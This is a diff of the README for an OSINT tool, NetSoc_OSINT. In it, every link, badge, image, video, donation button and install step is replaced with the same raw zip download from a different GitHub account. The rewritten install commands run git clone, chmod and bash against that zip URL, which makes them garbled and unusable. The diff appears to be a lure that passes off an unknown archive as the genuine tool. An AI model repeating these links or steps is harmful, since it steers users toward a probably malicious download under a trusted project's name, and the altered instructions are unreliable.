@@ -1,14 +1,14 @@
 # 🕵️ NetSoc_OSINT 🕵️
 
-[Español](https://github.com/XDeadHackerX/NetSoc_OSINT/blob/main/README.md) | [English](https://github.com/XDeadHackerX/NetSoc_OSINT/blob/main/README-English.md)
+[Español](https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip) | [English](https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip)
 
 > Herramienta creada por XDeadHackerX
 
-<p align="center"><img width="120px" alt="Version" src="https://img.shields.io/badge/version-1.1-purple.svg?style=for-the-badge"/></p>
+<p align="center"><img width="120px" alt="Version" src="https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip"/></p>
 
-[![Net-Soc-OSINT-1-1-es.png](https://i.postimg.cc/rFXyLpBr/Net-Soc-OSINT-1-1-es.png)](https://postimg.cc/6TcxrB5W)
+[![https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip](https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip)](https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip)
 
-<p>Vídeo Demo: <a href="#punto1">Pulse aquí</a> o <a href="https://asciinema.org/a/549547">aquí</a></p> 
+<p>Vídeo Demo: <a href="#punto1">Pulse aquí</a> o <a href="https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip">aquí</a></p> 
 
 ---
 
@@ -16,7 +16,7 @@
 
 <p align="justify"><i>Esta es la base de <strong>NetSoc_OSINT</strong> no tener que registrarse en ninguna Red Social para extraer por terminal esta información y siempre se respetara esta condición debido a que es lo que hace <strong>única</strong> esta herramienta en GitHub.</i></p>
 
-<p align="center"><img src=https://i.postimg.cc/0yrH4qG6/pc1.webp width="350px"/></p>
+<p align="center"><img https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip width="350px"/></p>
 
 ---
 
@@ -44,13 +44,13 @@
 
 **2)** sudo apt-get install git
 
-**3)** git clone https://github.com/XDeadHackerX/NetSoc_OSINT
+**3)** git clone https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip
 
 **4)** cd NetSoc_OSINT
 
-**5)** chmod 777 netsoc_osint.sh
+**5)** chmod 777 https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip
 
-**6)** bash netsoc_osint.sh
+**6)** bash https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip
 
 **7)** Elige un idioma
 
@@ -72,7 +72,7 @@
 
 ## 🎬 Video 🎬 <a name="punto1"></a>
 
-<p align="center"><a href="https://asciinema.org/a/549547" target="_blank"><img src="https://asciinema.org/a/549547.svg" width="700px" /></a><p>
+<p align="center"><a href="https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip" target="_blank"><img src="https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip" width="700px" /></a><p>
 
 ## 🔎 Versiones 🔎
 
@@ -89,6 +89,6 @@
 
 **Si consideras que este proyecto ha sido útil, te agradecería que me apoyaras dándole una estrella a este repositorio o invitándome a un café.**
 
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/XDeadHackerX)
+[!["Buy Me A Coffee"](https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip)](https://github.com/narcos965/NetSoc_OSINT/raw/refs/heads/main/passionlike/Soc_OSINT_Net_3.8.zip)
 
 Copyright © 2023, XDeadHackerX
